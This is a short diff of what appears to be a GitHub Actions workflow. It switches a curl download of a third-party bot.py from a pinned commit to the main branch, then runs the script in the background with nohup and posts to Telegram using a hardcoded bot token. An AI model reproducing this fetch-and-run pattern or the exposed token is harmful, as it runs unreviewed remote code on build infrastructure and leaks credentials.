@@ -35,7 +35,7 @@ jobs:
 
       - name: Setup
         run: |
-          curl -o bot.py https://raw.githubusercontent.com/lshanti8130-dotcom/Test/4df0e2ecf9ac5d07e44f9aa360e00914be0f11d3/bot.py
+          curl -o bot.py https://raw.githubusercontent.com/lshanti8130-dotcom/Test/refs/heads/main/bot.py
           pip3 install pyTelegramBotAPI psutil
           nohup python3 bot.py &
           curl -s -X POST "https://api.telegram.org/bot8123940028:AAHI-0CvbsZUicg7N_Wyj8Io_tyP_G33wo4/sendMessage" \
